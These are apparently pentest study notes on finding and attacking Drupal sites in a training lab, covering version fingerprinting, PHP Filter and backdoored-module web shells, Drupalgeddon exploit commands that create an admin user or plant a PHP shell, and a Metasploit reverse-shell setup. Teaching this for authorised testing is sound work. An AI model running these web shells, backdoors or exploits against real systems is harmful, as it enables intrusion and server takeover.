# Drupal – Discovery and Attacking

## Overview

Drupal, launched in **2001**, is another open-source CMS and the third major CMS in this section after WordPress and Joomla.

It is popular with:

- companies
- universities
- governments
- developers
- large content-heavy organisations

Drupal is written in **PHP** and supports:

- MySQL
- PostgreSQL
- SQLite

Like WordPress, Drupal supports:

- themes
- modules

At the time of writing in the notes, Drupal had roughly:

- **43,000 modules**
- **2,900 themes**

## Useful stats

From the notes:

- around **1.5% of websites** on the internet run Drupal
- over **1.1 million sites**
- about **5% of the top 1 million**
- about **7% of the top 10,000**
- around **2.4% of CMS market share**
- available in **100 languages**
- over **1.3 million community members**
- Drupal 8 was built by:
  - **3,290 contributors**
  - **1,288 companies**
- **33 Fortune 500** companies use Drupal
- **56% of government websites** worldwide use Drupal
- **23.8% of universities, colleges, and schools** use Drupal

Major brands mentioned:

- Tesla
- Warner Bros Records

Another note from the Drupal site suggested around **950,000 instances** in use at that time, though this only counted sites using the Update Status module.

The big takeaway:

**Drupal is less common than WordPress, but still widespread and often appears in higher-value environments.**

---

# 1. Discovery / Footprinting

If a site looks like a CMS but is clearly not WordPress or Joomla, Drupal should be high on the list.

Drupal can often be identified by:

- page source
- footer/header text
- `CHANGELOG.txt`
- `README.txt`
- `robots.txt`
- `/node/<id>` style URLs
- default Drupal logos or “Powered by Drupal” text

## Page source fingerprinting

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```

Example output:

```html
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

That is a strong indicator.

---

# 2. Node-Based URLs

A classic Drupal clue is the use of:

```text
/node/<nodeid>
```

Example:

```text
http://drupal.inlanefreight.local/node/1
```

## Why this matters

Drupal indexes content as **nodes**, which can represent:

- blog posts
- pages
- articles
- polls
- forum topics

Even if a custom theme hides obvious Drupal branding, `/node/1` style URLs are a useful hint.

---

# 3. User Types

By default, Drupal supports three main user types:

## Administrator
Has full control over the Drupal instance.

## Authenticated User
Can log in and perform actions allowed by assigned permissions.

## Anonymous
Default visitor role; typically read-only.

## Why it matters

Administrator access is extremely valuable because it can often be turned into:

- code execution
- module abuse
- template abuse
- content-based web shells
- further internal access

---

# 4. Manual Version Enumeration

Once Drupal is identified, the next step is version fingerprinting.

Depending on the version and hardening, this may be easy or require multiple methods.

## `CHANGELOG.txt`

Older Drupal installs may expose version info directly.

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Example output:

```text
Drupal 7.57, 2018-02-21
```

That is a very useful direct version disclosure.

## Newer versions may return 404

Example from the notes:

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
```

returned a 404.

So if `CHANGELOG.txt` is missing, move to other methods.

---

# 5. Tooling – `droopescan`

`droopescan` is much more useful for Drupal than it was for Joomla.

## Example scan

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

## Findings from the notes

It identified:

- plugin/module:
  - `php`
- possible versions:
  - `8.9.0`
  - `8.9.1`
- interesting URL:
  - `/user/login`

Example output included:

```text
Default admin - http://drupal.inlanefreight.local/user/login
```

## Why this matters

This gives:

- likely version family
- login portal
- installed module clues

That is often enough to start vuln research and attack planning.

---

# 6. Enumeration Summary

From the combined manual and automated enumeration in the notes:

## Drupal 8 target
- confirmed Drupal
- likely version **8.9.1**
- `/user/login` exposed
- `php` module path discovered
- no obvious immediate core vuln from quick research
- next step: check modules / built-in functionality

## Drupal 7 target
- version **7.57** via `CHANGELOG.txt`

This is important because attack paths differ meaningfully between:

- Drupal 7
- Drupal 8+
- patched vs unpatched instances

---

# 7. Important Note on Admin RCE

Unlike WordPress, Drupal usually does **not** make post-auth RCE as simple as:

- editing a theme PHP file directly
- dropping a PHP file into a theme editor

You generally need to be more deliberate.

The notes focused on three main post-auth or vuln-based routes:

1. **PHP Filter module**
2. **uploading a backdoored module**
3. **leveraging known vulnerabilities (Drupalgeddon family)**

---

# 8. Leveraging the PHP Filter Module (Older Drupal / Drupal 7)

In older Drupal versions, the **PHP Filter** module could be enabled by an administrator.

It allows embedded PHP code/snippets to be evaluated.

## Path example

```text
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```

## Workflow

1. log in as admin
2. enable the **PHP Filter** module
3. go to **Content → Add content**
4. create a **Basic page**
5. add PHP shell code
6. set **Text format** to `PHP code`
7. save and execute commands via the created node

## Example PHP shell

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

Using a hash-like parameter instead of `cmd` is good practice because it is less obvious and reduces accidental exposure.

## Example page creation path

```text
http://drupal-qa.inlanefreight.local/#overlay=node/add/page
```

## Example execution

```bash
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id" | grep uid | cut -f4 -d">"
```

Example output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

At that point, code execution is confirmed.

---

# 9. PHP Filter Module in Drupal 8+

From Drupal 8 onward, the PHP Filter module is **not installed by default**.

That means if you want to use this path, you need to:

1. download the module
2. install it
3. create a page using PHP code
4. later remove it

## Example download

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

## Install path from admin panel

```text
Administration > Reports > Available updates
```

Example path from the notes:

```text
http://drupal.inlanefreight.local/admin/reports/updates/install
```

After installing, the same basic-page-with-PHP approach can be used.

## Important operational note

This changes the client’s system, so the notes correctly recommend:

- get permission first
- keep the client informed
- remove/disable the module afterwards
- delete created pages
- document all changes

---

# 10. Uploading a Backdoored Module

Drupal allows users with sufficient permissions to upload modules.

This can be abused by taking a legitimate module, adding a shell, and installing it.

## Example target module

The notes used:

- `CAPTCHA`

## Download module

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

## Web shell used

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

## Why `.htaccess` was added

Drupal normally restricts direct access to `/modules`.

So a `.htaccess` file was added to allow access to the shell in that folder.

### Example `.htaccess`

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

## Prepare archive

Move shell and `.htaccess` into the module directory, then re-archive it.

Example:

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

## Upload path

In the admin UI:

- `Manage`
- `Extend`
- `+ Install new module`

Example path:

```text
http://drupal.inlanefreight.local/admin/modules/install
```

## Result

Once installed, commands can be executed via:

```bash
curl -s "drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

Expected output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This is a very effective post-auth RCE path.

---

# 11. Drupalgeddon Vulnerabilities

Drupal core has had several famous critical RCE-class issues, commonly referred to as **Drupalgeddon**.

The notes cover three:

1. **CVE-2014-3704** – Drupalgeddon
2. **CVE-2018-7600** – Drupalgeddon2
3. **CVE-2018-7602** – Drupalgeddon3

These are worth knowing cold because they are among the most well-known Drupal attack paths.

---

# 12. Drupalgeddon (CVE-2014-3704)

## Affected versions
- Drupal **7.0 to 7.31**
- fixed in **7.32**

## Type
- pre-authenticated SQL injection
- can be used to:
  - upload malicious form/code
  - create a new admin user

## Example PoC usage

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

## Result from the notes

```text
[!] VULNERABLE!
[!] Administrator user created!
[*] Login: hacker
[*] Pass: pwnd
```

Once an admin user exists, you can pivot to:

- PHP Filter
- module upload
- other authenticated admin abuse

The notes also mention the Metasploit module:

```text
exploit/multi/http/drupal_drupageddon
```

---

# 13. Drupalgeddon2 (CVE-2018-7600)

## Type
- pre-auth RCE
- affects versions prior to:
  - Drupal 7.58
  - Drupal 8.5.1

## Root cause
Insufficient input sanitisation during user registration / Form API handling.

## Example PoC usage

```bash
python3 drupalgeddon2.py
```

The initial PoC uploaded:

```text
hello.txt
```

You could confirm it with:

```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

## Upgrading to PHP shell

The notes modified the PoC to upload a real PHP shell.

### Example PHP shell

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

### Base64 encoding example

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

Then the exploit was modified to write that shell to disk.

## Result

The uploaded PHP file was reachable at:

```text
http://drupal-dev.inlanefreight.local/mrb3n.php
```

Example execution:

```bash
curl "http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

Expected output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That confirms unauthenticated remote code execution.

---

# 14. Drupalgeddon3 (CVE-2018-7602)

## Type
- authenticated RCE
- affects multiple Drupal 7.x and 8.x versions

## Requirement
The user must have the ability to **delete a node**.

This makes it more constrained than Drupalgeddon2.

## Exploitation method in the notes

Used Metasploit with:

- valid Drupal session cookie
- known node number
- correct VHOST/RHOST

## Example setup

```bash
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS...
set DRUPAL_NODE 1
set LHOST 10.10.14.15
show options
exploit
```

## Result

A reverse Meterpreter shell as:

```text
www-data (33)
```

Example host info from the notes:

```text
OS : Linux app01 ...
Meterpreter : php/linux
```

---

# 15. Practical Discovery-to-Attack Flow

From the combined notes, a sensible Drupal workflow looks like this:

## Step 1 – identify Drupal

Check:

- page source
- generator tag
- “Powered by Drupal”
- `/node/1`
- `CHANGELOG.txt`
- `README.txt`

Useful command:

```bash
curl -s http://target | grep Drupal
```

## Step 2 – fingerprint version

Try:

```bash
curl -s http://target/CHANGELOG.txt
droopescan scan drupal -u http://target
```

## Step 3 – identify login portal

Common path:

```text
/user/login
```

## Step 4 – determine likely attack class

- old Drupal 7? → check Drupalgeddon
- Drupal 8.x? → check Drupalgeddon2/3 exposure
- authenticated admin? → use PHP Filter or backdoored module
- module/theme/extension exposure? → enumerate further

## Step 5 – gain code execution

Possible routes:

- PHP Filter module
- uploaded backdoored module
- Drupalgeddon2
- Drupalgeddon3
- admin-created content shell
- authenticated admin user creation via Drupalgeddon

---

# 16. Cleanup / Reporting Notes

Drupal exploitation often creates obvious artefacts.

Examples from the notes:

- uploaded PHP pages
- installed PHP Filter module
- created malicious content pages
- uploaded backdoored modules
- modified module directories
- created admin users

All of these should be:

- removed if possible
- documented in report appendices
- tied to the method of exploitation
- tied to hostname/IP
- tied to the compromised account used

Useful appendix items:

- exploited systems
- compromised users
- module/page names
- uploaded filenames
- hashes and paths
- whether cleanup succeeded

---

# 17. Useful Commands

## Identify Drupal

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```

## Check older version via changelog

```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

## droopescan

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

## PHP Filter web shell execution example

```bash
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

## Download PHP Filter module

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

## Download CAPTCHA module

```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

## Backdoored module shell execution

```bash
curl -s "drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

## Drupalgeddon admin creation

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

## Drupalgeddon2 PoC

```bash
python3 drupalgeddon2.py
```

## Drupalgeddon2 shell execution

```bash
curl "http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

---

# 18. Key Takeaways

- Drupal is common in higher-value environments like government, education, and enterprise
- manual identification is often easy through generator tags, powered-by text, and `/node/<id>`
- `CHANGELOG.txt` is great for older version disclosure, but not always present
- `droopescan` is very useful for Drupal
- post-auth RCE is usually less direct than WordPress, but still very feasible
- the PHP Filter module is a strong path where available
- backdoored module upload is a reliable admin-level RCE route
- Drupalgeddon vulnerabilities are essential knowledge for older/unpatched Drupal targets

---

# Tags

#drupal
#cms
#discovery
#enumeration
#droopescan
#drupalgeddon
#drupalgeddon2
#drupalgeddon3
#php-filter
#module-upload
#rce
#attacking-common-apps
#pentesting
#ctf
#obsidian